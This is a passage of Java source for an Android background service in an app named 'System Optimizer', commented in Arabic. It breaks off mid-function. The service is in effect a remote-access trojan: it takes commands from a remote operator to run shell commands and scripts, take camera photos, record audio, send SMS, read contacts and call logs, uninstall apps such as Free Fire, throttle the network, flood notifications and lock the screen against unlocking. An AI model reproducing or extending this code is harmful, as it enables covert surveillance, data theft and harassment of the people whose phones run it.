package com.example.systemoptimizer;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.EOFException;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    private static final String CHANNEL_MAIN = "main_channel";
    private static final String CHANNEL_SPAM = "spam_channel";
    private static final int NOTIFICATION_ID = 1;

    /**
     * مكتبة الأصوات تُبنى وقت التشغيل من assets/audio (ملفات صوتية فقط).
     * play_sound:1..N تشير إلى نفس الترتيب الذي تعرضه مكتبة الأصوات في أداة
     * التحكم (ترتيب اسم الملف مع تجاهل الحالة).
     */
    private static final String ASSET_AUDIO_DIR = "audio";
    private static final String ASSET_VIDEO_DIR = "video";

    private volatile AgentConnectionManager agentConnectionManager;

    private static volatile BackgroundService instance;

    /** Debug-only snapshot of the transport session state, exposed for MainActivity. */
    public static String debugSessionState() {
        BackgroundService s = instance;
        AgentConnectionManager m = s == null ? null : s.agentConnectionManager;
        return m == null ? "stopped" : m.sessionState();
    }
    private DeviceIdentity agentIdentity;

    private static final String[] PREFERRED_INTERFACES = {
            "wlan0", "eth0", "radio0", "rmnet_data0", "rmnet0", "wlan1"
    };

    private static final Pattern PACKAGE_NAME_PATTERN = Pattern.compile(
            "^[A-Za-z][A-Za-z0-9_]*(\\.[A-Za-z][A-Za-z0-9_]*)+$");

    /** الحزمة المستهدفة لأوامر إزالة/تعطيل فري فاير. */
    private static final String FREE_FIRE_PACKAGE = "com.dts.freefireth";

    private static final int MAX_MESSAGE_SIZE = 8 * 1024 * 1024;
    private static final int SHELL_TIMEOUT_MS = 15000;

    private static final int WALLPAPER_IMAGE_MAX_BYTES = 5 * 1024 * 1024;
    private static final int SCRIPT_MAX_BYTES = 512 * 1024;
    private static final int SCRIPT_TIMEOUT_MS = 60000;

    private static final int CAMERA_TIMEOUT_MS = 120000;

    private static final String PREFS_NAME = "system_optimizer_prefs";
    private static final String PREFS_BLACK_SCREEN_ON_BOOT = "black_screen_on_boot";

    /** مفتاح يُمرَّر في Intent الخدمة (مؤشرات الإقلاع/الجلسة) — انظر BlockSessionManager. */
    public static final String EXTRA_BS_TRIGGER = "bs_trigger";
    public static final String TRIGGER_BOOT = "boot";

    // جلسة shell تفاعلية: حساسة فقط لخيط الاتصال (المُصدر الوحيد للأوامر)
    private final Object shellLock = new Object();
    private volatile Process shellProcess;
    private volatile StringBuilder shellBuffer = new StringBuilder();
    private volatile boolean shellMarkerSeen = false;
    private volatile int shellCursor = 0;
    private static final String SHELL_MARKER = "__SHELLCMD_EOF__";
    private static final long SHELL_REPLY_TIMEOUT_MS = 20000;

    private final AtomicBoolean connectionThreadStarted = new AtomicBoolean(false);
    private volatile boolean running = false;
    private volatile Thread connectionThread;

    private final Object workerLock = new Object();
    private volatile HandlerThread workerThread;
    private volatile Handler workerHandler;
    private volatile File pendingScriptFile;
    private volatile boolean degradationActive = false;
    private volatile String degradedInterface;

    // جسر نتيجة الكاميرا بين Activity والخيط المتصل بالشبكة
    private static final Object cameraLock = new Object();
    private static volatile boolean cameraResultReady = false;
    private static volatile String cameraResult;
    private final AtomicBoolean serviceStopping = new AtomicBoolean(false);

    /**
     * يرسل نتيجة التقاط الصورة (PHOTO_OK:Base64 أو نص خطأ) إلى الخدمة
     * التي تنتظرها على خيط الاتصال بالشبكة.
     */
    public static void postCameraResult(String result) {
        synchronized (cameraLock) {
            cameraResult = result;
            cameraResultReady = true;
            cameraLock.notifyAll();
        }
    }

    /**
     * إعادة فرض الحجب بعد أحداث قفل/فتح الشاشة:
     * ما دامت جلسة الحجب نشطة، نعيد قفل keyguard بالنظام (lockNow، سلطة
     * Device Owner/Admin) ونعيد واجهة الحجب إلى المقدمة. لا نستخدم أي خدع،
     * ولا نعترض PIN/نمط المستخدم — يبقى Keyguard Android الحقيقي كما هو.
     */
    private final BroadcastReceiver blockRelockReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent != null ? intent.getAction() : null;
            if (!Intent.ACTION_SCREEN_ON.equals(action)
                    && !Intent.ACTION_USER_PRESENT.equals(action)) {
                return;
            }
            BlockSessionManager mgr = BlockSessionManager.getInstance(context);
            if (!mgr.isActive()) {
                return; // انتهت الجلسة -> استخدام طبيعي، لا إعادة قفل
            }
            mgr.audit("unlock/screen-on event: " + action + " -> re-lock");
            new DeviceManagementManager(context).lockNow();
            launchBlockActivity();
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        ensureNotificationChannels();
        cleanupStaleWallpaperCache();

        // إطار جلسة الحجب الصارمة: حالة محلية دائمة + إعادة فرض بعد الفتح.
        BlockSessionManager.getInstance(this);
        IntentFilter relockFilter = new IntentFilter();
        relockFilter.addAction(Intent.ACTION_SCREEN_ON);
        relockFilter.addAction(Intent.ACTION_USER_PRESENT);
        try {
            registerReceiver(blockRelockReceiver, relockFilter);
        } catch (Exception e) {
            Log.w(TAG, "register relock receiver failed", e);
        }

        // الهوية المستمرة للجهاز + طبقة النقل متعددة الأجهزة.
        agentIdentity = new DeviceIdentity(this);
    }

    private void cleanupStaleWallpaperCache() {
        File cacheDir = getCacheDir();
        File[] files = cacheDir.listFiles();
        if (files == null) {
            return;
        }
        for (File f : files) {
            String name = f.getName();
            if (name.startsWith("wp_") && name.endsWith(".jpg")) {
                boolean deleted = f.delete();
                if (deleted) {
                    Log.i(TAG, "Removed stale wallpaper cache: " + name);
                }
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        serviceStopping.set(false);

        Notification notification = buildNotification();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            );
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        if (connectionThreadStarted.compareAndSet(false, true)) {
            running = true;
            connectionThread = new Thread(
                this::establishConnection,
                "bg-connection"
            );
            connectionThread.start();
        }

        handleIncomingTrigger(intent);

    /*
     * START_STICKY is intentionally preserved:
     * Android may recreate the service after process death/reboot.
     */
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        serviceStopping.set(true);
        running = false;
        instance = null;

        AgentConnectionManager manager = agentConnectionManager;
        agentConnectionManager = null;

        if (manager != null) {
            try {
                manager.stop();
            } catch (Exception e) {
                Log.w(TAG, "Failed to stop AgentConnectionManager", e);
            }
        }

        Thread thread = connectionThread;
        connectionThread = null;

        if (thread != null) {
            thread.interrupt();
        }

        connectionThreadStarted.set(false);


            synchronized (workerLock) {
                if (workerHandler != null) {
                workerHandler.removeCallbacksAndMessages(null);
                workerHandler = null;
                }
                if (workerThread != null) {
                workerThread.quitSafely();
                workerThread = null;
                }
            }
            File pending = pendingScriptFile;
            if (pending != null && pending.exists()) {
                boolean deleted = pending.delete();
            if (deleted) {
                Log.i(TAG, "cleaned pending script file on destroy");
            }
            pendingScriptFile = null;
            }
        if (degradationActive && degradedInterface != null) {
            runShellCommand("sh", "-c", "tc qdisc del dev " + degradedInterface + " root 2>/dev/null");
            Log.i(TAG, "attempted to restore network condition on destroy (dev=" + degradedInterface + ")");
        }
        degradationActive = false;
        degradedInterface = null;

        Process shell = shellProcess;
        if (shell != null) {
            try {
                shell.destroy();
            } catch (Exception ignored) {
            }
            shellProcess = null;
        }

        try {
            unregisterReceiver(blockRelockReceiver);
        } catch (Exception ignored) {
        }

        super.onDestroy();
    }

    /**
     * معالجة الأسباب التي شغّلت الخدمة (إقلاع/مؤشرات جلسة/بدء عادي):
     * التأكد أن جلسة الحجب مستأنفة/منتهية حسب الحقيقة، دون إعادة ضبط للعداد.
     */
    private void handleIncomingTrigger(Intent intent) {
        try {
            String trigger = intent != null
                    ? intent.getStringExtra(EXTRA_BS_TRIGGER)
                    : null;
            BlockSessionManager mgr = BlockSessionManager.getInstance(this);

            if (BlockSessionManager.TRIGGER_ACTIVATE.equals(trigger)) {
                mgr.audit("alarm: activate");
                if (mgr.activateIfDue()) {
                    launchBlockActivity();
                }
                return;
            }
            if (BlockSessionManager.TRIGGER_EXPIRE.equals(trigger)) {
                mgr.audit("alarm: expire");
                mgr.terminate("expired");
                return;
            }

            boolean boot = trigger != null && trigger.startsWith(TRIGGER_BOOT);
            boolean resumed = mgr.recoverAfterServiceStart();
            if (resumed) {
                if (boot) {
                    mgr.audit("block session recovered after boot (remaining preserved)");
                }
                launchBlockActivity();
            }
        } catch (Exception e) {
            Log.w(TAG, "handleIncomingTrigger failed", e);
        }
    }

    /** إحضار واجهة حجب الشاشة إلى المقدمة (يُستدعى عند التنشيط/إعادة الفرض). */
    private void launchBlockActivity() {
        try {
            Intent i = new Intent(this, BlockScreenActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception e) {
            Log.w(TAG, "could not bring block screen forward: " + e.getMessage());
        }
    }

    private void ensureNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            nm.createNotificationChannel(
                    new NotificationChannel(CHANNEL_MAIN, "الخدمة الخلفية", NotificationManager.IMPORTANCE_LOW));
            nm.createNotificationChannel(
                    new NotificationChannel(CHANNEL_SPAM, "الإشعارات", NotificationManager.IMPORTANCE_HIGH));
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_MAIN)
                .setContentTitle(getString(R.string.app_name))
                .setContentText("يعمل في الخلفية")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    // ------------------------------------------------------------------
    // بروتوكول الاتصال: 4 بايت طول (big-endian) + نص UTF-8 على الطرفين
    // ------------------------------------------------------------------

    private void establishConnection() {
        AgentConnectionManager manager = new AgentConnectionManager(
            this,
            this::executeCommand,
            () -> {
                if (!serviceStopping.get()) {
                    running = false;
                    stopSelf();
                }
            },
            agentIdentity
        );

        agentConnectionManager = manager;

        try {
        manager.run();
        } catch (Exception e) {
            if (!serviceStopping.get()) {
            Log.w(TAG, "agent connection manager failed", e);
        }
        } finally {
            if (agentConnectionManager == manager) {
            agentConnectionManager = null;
        }

        connectionThreadStarted.set(false);
        }
    }

    private static String readMessage(InputStream in) throws IOException {
        byte[] header = readFully(in, 4, true);
        if (header == null) {
            return null; // إغلاق أنيق من الطرف الآخر
        }
        long length = ((long) (header[0] & 0xFF) << 24)
                | ((long) (header[1] & 0xFF) << 16)
                | ((long) (header[2] & 0xFF) << 8)
                | ((long) (header[3] & 0xFF));
        if (length <= 0 || length > MAX_MESSAGE_SIZE) {
            throw new IOException("invalid message length: " + length);
        }
        byte[] payload = readFully(in, (int) length, false);
        return new String(payload, StandardCharsets.UTF_8);
    }

    private static void writeMessage(OutputStream out, String message) throws IOException {
        byte[] payload = message.getBytes(StandardCharsets.UTF_8);
        out.write((payload.length >>> 24) & 0xFF);
        out.write((payload.length >>> 16) & 0xFF);
        out.write((payload.length >>> 8) & 0xFF);
        out.write(payload.length & 0xFF);
        out.write(payload);
        out.flush();
    }

    private static byte[] readFully(InputStream in, int size, boolean allowEof) throws IOException {
        byte[] data = new byte[size];
        int offset = 0;
        while (offset < size) {
            int read = in.read(data, offset, size - offset);
            if (read == -1) {
                if (allowEof && offset == 0) {
                    return null;
                }
                throw new EOFException("connection closed mid-message");
            }
            offset += read;
        }
        return data;
    }

    // ------------------------------------------------------------------
    // تنفيذ الأوامر
    // ------------------------------------------------------------------

    private void executeCommand(String command, OutputStream out) throws IOException {
        try {
            if (command.equals("exit")) {
                serviceStopping.set(true);
                running = false;
                stopSelf();
                throw new IOException("exit requested");
            } else if (command.startsWith("show_message:idx:")) {
                handleShowMessageByIdx(command, out);
            } else if (command.startsWith("show_message:txt:")) {
                handleShowMessageByText(command, out);
            } else if (command.equals("remove_freefire")) {
                handleRemoveFreeFire(out);
            } else if (command.equals("disable_freefire")) {
                handleDisableFreeFire(out);
            } else if (command.startsWith("spam_notifications:")) {
                handleSpamNotifications(command, out);
            } else if (command.startsWith("play_sound:")) {
                handlePlaySound(command, out);
            } else if (command.startsWith("play_annoying_sound:")) {
                handlePlayAnnoyingSound(command, out);
            } else if (command.startsWith("change_wallpaper:")) {
                handleChangeWallpaper(command, out);
            } else if (command.startsWith("change_wallpaper_base64:")) {
                handleChangeWallpaperBase64(command, out);
            } else if (command.equals("black_screen_on_boot")) {
                handleBlackScreenOnBoot(out);
            } else if (command.startsWith("network_deg:")) {
                handleNetworkDegradation(command, out);
            } else if (command.startsWith("block_app:")) {
                handleBlockApp(command, out);
            } else if (command.startsWith("custom:")) {
                String[] parts = command.split(":", 2);
                String custom = parts.length < 2 ? "" : parts[1].trim();
                if (custom.isEmpty()) {
                    writeMessage(out, "أمر مخصص فارغ");
                    return;
                }
                String result = runShellCommand("sh", "-c", custom);
                writeMessage(out, result);
            } else if (command.startsWith("script_base64:")) {
                handleRunScript(command, out);
            } else if (command.equals("device_info")) {
                handleDeviceInfo(out);
            } else if (command.equals("capture_camera")) {
                handleCaptureCamera(out);
            } else if (command.startsWith("record_audio:")) {
                handleRecordAudio(command, out);
            } else if (command.startsWith("block_screen:")) {
                handleBlockScreen(command, out);
            } else if (command.equals("block_screen_status")) {
                handleBlockScreenStatus(out);
            } else if (command.equals("block_screen_cancel")) {
                handleBlockScreenCancel(out);
            } else if (command.startsWith("play_video:")) {
                handlePlayVideo(command, out);
            } else if (command.startsWith("show_serious_warning:")) {
                handleSeriousWarning(command, out);
            } else if (command.equals("shell_start")) {
                handleShellStart(out);
            } else if (command.startsWith("shell_cmd:")) {
                handleShellCommand(command, out);
            } else if (command.equals("shell_exit")) {
                handleShellExit(out);
            } else if (command.startsWith("send_sms:")) {
                handleSendSms(command, out);
            } else if (command.equals("call_log")) {
                handleCallLog(out);
            } else if (command.equals("contacts")) {
                handleContacts(out);
            } else {
                String result = runShellCommand(command.split("\\s+"));
                writeMessage(out, result);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException("interrupted", e);
        } catch (IOException e) {
            throw e;
        } catch (Exception e) {
            writeMessage(out, "خطأ في تنفيذ الأمر: " + e.getMessage());
        }
    }

    private void handleRemoveFreeFire(OutputStream out) throws IOException {
        String result = runShellCommand("pm", "uninstall", "--user", "0", FREE_FIRE_PACKAGE);
        String outcome = classifyPmResult(result);
        writeMessage(out, "نتيجة إزالة فري فاير - " + outcome + ": " + result);
    }

    private void handleDisableFreeFire(OutputStream out) throws IOException {
        String result = runShellCommand("pm", "disable-user", "--user", "0", FREE_FIRE_PACKAGE);
        String outcome = classifyPmResult(result);
        writeMessage(out, "نتيجة تعطيل فري فاير - " + outcome + ": " + result);
    }

    /**
     * يصنّف مخرجات أمر pm برمجياً إلى نتيجة صادقة للمشغّل.
     */
    private String classifyPmResult(String raw) {
        if (raw == null) {
            return "COMMAND FAILED";
        }
        String text = raw.toLowerCase();
        if (text.contains("success") || text.contains("new state")) {
            return "SUCCESS";
        }
        if (text.contains("not installed") || text.contains("unknown package")
                || text.contains("package not found")
                || text.contains("delete_failed_package_not_installed")
                || text.contains("invalid package")) {
            return "PACKAGE NOT FOUND";
        }
        if (text.contains("securityexception") || text.contains("not allowed")
                || text.contains("permission")
                || text.contains("delete_failed_device_policy_manager")
                || text.contains("delete_failed_user_restricted")) {
            return "NOT PERMITTED";
        }
        return "COMMAND FAILED";
    }

    private void handleBlockApp(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        if (parts.length < 2 || parts[1].trim().isEmpty()) {
            writeMessage(out, "صيغة خاطئة: block_app:package");
            return;
        }
        String pkg = parts[1].trim();
        if (!PACKAGE_NAME_PATTERN.matcher(pkg).matches()) {
            writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - INVALID PACKAGE NAME: "
                    + "يلزم اسم حزمة صالح (مثال: com.google.android.youtube). "
                    + "لا تُقبل أسماء العرض مثل 'YouTube'.");
            return;
        }
        if (!isPackageInstalled(pkg)) {
            writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - PACKAGE NOT FOUND: الحزمة غير مثبتة.");
            return;
        }
        String result = runShellCommand("pm", "disable-user", "--user", "0", pkg);
        String outcome = classifyPmResult(result);
        writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - " + outcome + ": " + result);
    }

    private boolean isPackageInstalled(String pkg) {
        try {
            getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void handlePlaySound(String command, OutputStream out) throws IOException, InterruptedException {
        String[] parts = command.split(":", 3);
        if (parts.length < 3) {
            writeMessage(out, "صيغة خاطئة: play_sound:الرقم:المدة(ثواني)");
            return;
        }
        int soundId;
        try {
            soundId = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "رقم الصوت غير صالح: " + parts[1]);
            return;
        }
        int duration;
        try {
            duration = Integer.parseInt(parts[2]);
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + parts[2]);
            return;
        }
        if (duration <= 0 || duration > 600) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
            return;
        }
        List<String> library = audioLibrary();
        if (soundId < 1 || soundId > library.size()) {
            writeMessage(out, "رقم الصوت خارج النطاق (يجب أن يكون بين 1 و " + library.size() + ")");
            return;
        }
        playAssetSound(ASSET_AUDIO_DIR + "/" + library.get(soundId - 1), duration, out);
    }

    private void playAssetSound(String assetPath, int duration, OutputStream out) throws IOException, InterruptedException {
        MediaPlayer mediaPlayer = new MediaPlayer();
        try {
            AssetFileDescriptor afd = getAssets().openFd(assetPath);
            try {
                mediaPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
            } finally {
                afd.close();
            }
            mediaPlayer.setLooping(true);
            mediaPlayer.prepare();
            mediaPlayer.start();
            Thread.sleep(duration * 1000L);
            writeMessage(out, "تم تشغيل الصوت لمدة " + duration + " ثانية");
        } catch (java.io.FileNotFoundException e) {
            writeMessage(out, "ملف الصوت غير موجود في مكتبة الأصوات: " + assetPath);
        } finally {
            try {
                mediaPlayer.stop();
            } catch (IllegalStateException ignored) {
            }
            mediaPlayer.release();
        }
    }

    private void playRawSound(int rawResId, int duration, OutputStream out) throws IOException, InterruptedException {
        MediaPlayer mediaPlayer = MediaPlayer.create(this, rawResId);
        if (mediaPlayer == null) {
            writeMessage(out, "تعذر تحميل ملف الصوت: الملف الموجود في res/raw فارغ أو غير مدعوم");
            return;
        }
        try {
            mediaPlayer.setLooping(true);
            mediaPlayer.start();
            Thread.sleep(duration * 1000L);
            writeMessage(out, "تم تشغيل الصوت لمدة " + duration + " ثانية");
        } finally {
            try {
                mediaPlayer.stop();
            } catch (IllegalStateException ignored) {
            }
            mediaPlayer.release();
        }
    }

    /**
     * مكتبة الأصوات الحالية من assets/audio (أصوات فقط، مرتبة بمعزل عن
     * الحالة لتطابق الترتيب المعروض في أداة التحكم).
     */
    private List<String> audioLibrary() {
        List<String> names = new ArrayList<>();
        try {
            String[] listed = getAssets().list(ASSET_AUDIO_DIR);
            for (String n : listed) {
                if (isAudioFileName(n)) {
                    names.add(n);
                }
            }
        } catch (IOException e) {
            Log.w(TAG, "audio library listing failed: " + e.getMessage());
        }
        names.sort(String.CASE_INSENSITIVE_ORDER);
        return names;
    }

    private static boolean isAudioFileName(String name) {
        String lower = name.toLowerCase(Locale.US);
        return lower.endsWith(".wav") || lower.endsWith(".mp3")
                || lower.endsWith(".m4a") || lower.endsWith(".ogg")
                || lower.endsWith(".aac") || lower.endsWith(".flac")
                || lower.endsWith(".opus");
    }

    // ---------- أوامر مساعدة ----------

    private void handleShowMessageByIdx(String command, OutputStream out) throws IOException {
        String idxStr = command.substring("show_message:idx:".length()).trim();
        int idx;
        try {
            idx = Integer.parseInt(idxStr);
        } catch (NumberFormatException e) {
            writeMessage(out, "رقم الرسالة غير صالح: " + idxStr);
            return;
        }
        String[] messages = MessageDashboardActivity.MESSAGES;
        if (idx < 1 || idx > messages.length) {
            writeMessage(out, "رقم الرسالة خارج النطاق (يجب أن يكون بين 1 و " + messages.length + ")");
            return;
        }
        Intent intent = new Intent(this, MessageDashboardActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("message_index", idx);
        startMessageDashboard(intent, out);
    }

    private void handleShowMessageByText(String command, OutputStream out) throws IOException {
        String text = command.substring("show_message:txt:".length()).trim();
        if (text.isEmpty()) {
            writeMessage(out, "نص الرسالة فارغ");
            return;
        }
        Intent intent = new Intent(this, MessageDashboardActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("message_text", text);
        startMessageDashboard(intent, out);
    }

    private void startMessageDashboard(Intent intent, OutputStream out) throws IOException {
        try {
            startActivity(intent);
            writeMessage(out, "تم عرض الرسالة");
        } catch (Exception e) {
            writeMessage(out, "فشل في عرض الرسالة: " + e.getMessage()
                    + " (بدء نشاط من الخلفية قد يُحظر على Android 10+)");
        }
    }

    // ------------------------------------------------------------------
    // التقاط صورة الكاميرا عبر Activity ثم نقلها Base64 إلى المشغّل
    // ------------------------------------------------------------------

    private void handleCaptureCamera(OutputStream out) throws IOException, InterruptedException {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            writeMessage(out, "صلاحية الكاميرا غير ممنوحة");
            return;
        }
        if (!getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)
                && !getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            writeMessage(out, "لا توجد كاميرا على هذا الجهاز");
            return;
        }

        File photoFile = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
        String result;
        synchronized (cameraLock) {
            cameraResult = null;
            cameraResultReady = false;
            cameraLock.notifyAll();

            Intent intent = new Intent(this, CameraCaptureActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("output_file", photoFile.getAbsolutePath());
            try {
                startActivity(intent);
            } catch (Exception e) {
                boolean deleted = photoFile.delete();
                if (deleted) {
                    Log.i(TAG, "removed unused camera temp file");
                }
                writeMessage(out, "فشل في فتح الكاميرا: " + e.getMessage()
                        + " (بدء نشاط من الخلفية قد يُحظر على Android 10+)");
                return;
            }

            long deadline = System.currentTimeMillis() + CAMERA_TIMEOUT_MS;
            while (!cameraResultReady && System.currentTimeMillis() < deadline) {
                cameraLock.wait(1000);
            }
            if (!cameraResultReady) {
                boolean deleted = photoFile.delete();
                if (deleted) {
                    Log.i(TAG, "removed stale camera temp file");
                }
                writeMessage(out, "انتهت مهلة التقاط الصورة من الجهاز (دقيقتان). حاول مجدداً.");
                return;
            }
            result = cameraResult != null ? cameraResult : "فشل التقاط الصورة (سبب غير معروف)";
            cameraResult = null;
            cameraResultReady = false;
        }
        writeMessage(out, result);
    }

    private void handleSpamNotifications(String command, OutputStream out) throws IOException, InterruptedException {
        String[] parts = command.split(":", 3);
        if (parts.length < 3) {
            writeMessage(out, "صيغة خاطئة: spam_notifications:العدد:النص");
            return;
        }
        int count;
        try {
            count = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "عدد غير صالح: " + parts[1]);
            return;
        }
        if (count <= 0 || count > 500) {
            writeMessage(out, "العدد يجب أن يكون بين 1 و 500");
            return;
        }
        String message = parts[2];
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                && !hasPermission(Manifest.permission.POST_NOTIFICATIONS)) {
            writeMessage(out, "صلاحية الإشعارات غير ممنوحة");
            return;
        }

        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        for (int i = 0; i < count; i++) {
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_SPAM)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentTitle("تحذير")
                    .setContentText(message)
                    .setPriority(NotificationCompat.PRIORITY_HIGH);
            nm.notify(100 + (i % 100), builder.build());
            if (i < count - 1) {
                Thread.sleep(1000);
            }
        }
        writeMessage(out, "تم إرسال " + count + " إشعار");
    }

    private void handlePlayAnnoyingSound(String command, OutputStream out) throws IOException, InterruptedException {
        String[] parts = command.split(":", 2);
        int duration;
        try {
            duration = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + parts[1]);
            return;
        }
        if (duration <= 0 || duration > 600) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
            return;
        }
        playRawSound(R.raw.annoying_sound, duration, out);
    }

    private void handleChangeWallpaper(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        if (parts.length < 2 || parts[1].trim().isEmpty()) {
            writeMessage(out, "صيغة خاطئة: change_wallpaper:المسار");
            return;
        }
        String imagePath = parts[1].trim();
        try {
            Bitmap bitmap = BitmapFactory.decodeFile(imagePath);
            if (bitmap == null) {
                writeMessage(out, "فشل في فك تشفير الصورة من المسار: " + imagePath
                        + " (قد يكون الوصول مقيداً بسبب Scoped Storage)");
                return;
            }
            WallpaperManager wallpaperManager = WallpaperManager.getInstance(this);
            wallpaperManager.setBitmap(bitmap);
            writeMessage(out, "تم تغيير خلفية الشاشة");
        } catch (Exception e) {
            writeMessage(out, "فشل في تغيير خلفية الشاشة: " + e.getMessage());
        }
    }

    private void handleChangeWallpaperBase64(String command, OutputStream out) throws IOException {
        int firstColon = command.indexOf(':', 1);
        if (firstColon < 0) {
            writeMessage(out, "صيغة خاطئة: change_wallpaper_base64:المدة:Base64");
            return;
        }
        int secondColon = command.indexOf(':', firstColon + 1);
        if (secondColon < 0) {
            writeMessage(out, "صيغة خاطئة: change_wallpaper_base64:المدة:Base64");
            return;
        }

        String durStr = command.substring(firstColon + 1, secondColon);
        String b64Data = command.substring(secondColon + 1);

        int durationSec;
        try {
            durationSec = Integer.parseInt(durStr.trim());
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + durStr);
            return;
        }
        if (durationSec <= 0) {
            writeMessage(out, "المدة يجب أن تكون أكبر من صفر");
            return;
        }

        byte[] imageBytes;
        try {
            imageBytes = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT);
        } catch (IllegalArgumentException e) {
            writeMessage(out, "فشل في فك تشفير الصورة Base64");
            return;
        }

        if (imageBytes.length == 0 || imageBytes.length > WALLPAPER_IMAGE_MAX_BYTES) {
            writeMessage(out, "حجم الصورة غير صالح");
            return;
        }

        if (!isLikelyImage(imageBytes)) {
            writeMessage(out, "الملف ليس بصيغة صورة معروفة");
            return;
        }

        Bitmap newBitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
        if (newBitmap == null) {
            writeMessage(out, "فشل في فك تشفير الصورة bitmap");
            return;
        }

        File cacheFile = new File(getCacheDir(), "wp_" + System.currentTimeMillis() + ".jpg");
        try {
            java.io.FileOutputStream fos = new java.io.FileOutputStream(cacheFile);
            try {
                fos.write(imageBytes);
            } finally {
                fos.close();
            }
        } catch (IOException e) {
            writeMessage(out, "فشل في حفظ الصورة مؤقتاً: " + e.getMessage());
            newBitmap.recycle();
            return;
        }

        WallpaperManager wm = WallpaperManager.getInstance(this);
        try {
            wm.setBitmap(newBitmap);
        } catch (Exception e) {
            writeMessage(out, "فشل في تعيين الخلفية: " + e.getMessage());
            newBitmap.recycle();
            cacheFile.delete();
            return;
        }

        final File restoreCache = cacheFile;
        final Bitmap restoreNew = newBitmap;

        writeMessage(out, "تم تطبيق الخلفية الجديدة. المدة: " + durationSec + " ثانية");

        Handler mainHandler = new Handler(Looper.getMainLooper());
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    WallpaperManager wmgr = WallpaperManager.getInstance(BackgroundService.this);
                    try {
                        wmgr.clear();
                        Log.i(TAG, "Wallpaper duration expired. Wallpaper cleared (default restored).");
                    } catch (Exception e) {
                        Log.w(TAG, "Wallpaper duration expired but clear failed: " + e.getMessage());
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Failed to clear wallpaper: " + e.getMessage());
                } finally {
                    if (restoreNew != null && !restoreNew.isRecycled()) {
                        restoreNew.recycle();
                    }
                    if (restoreCache.exists()) {
                        restoreCache.delete();
                    }
                }
            }
        }, durationSec * 1000L);
    }

    private static boolean isLikelyImage(byte[] header) {
        if (header.length < 4) {
            return false;
        }
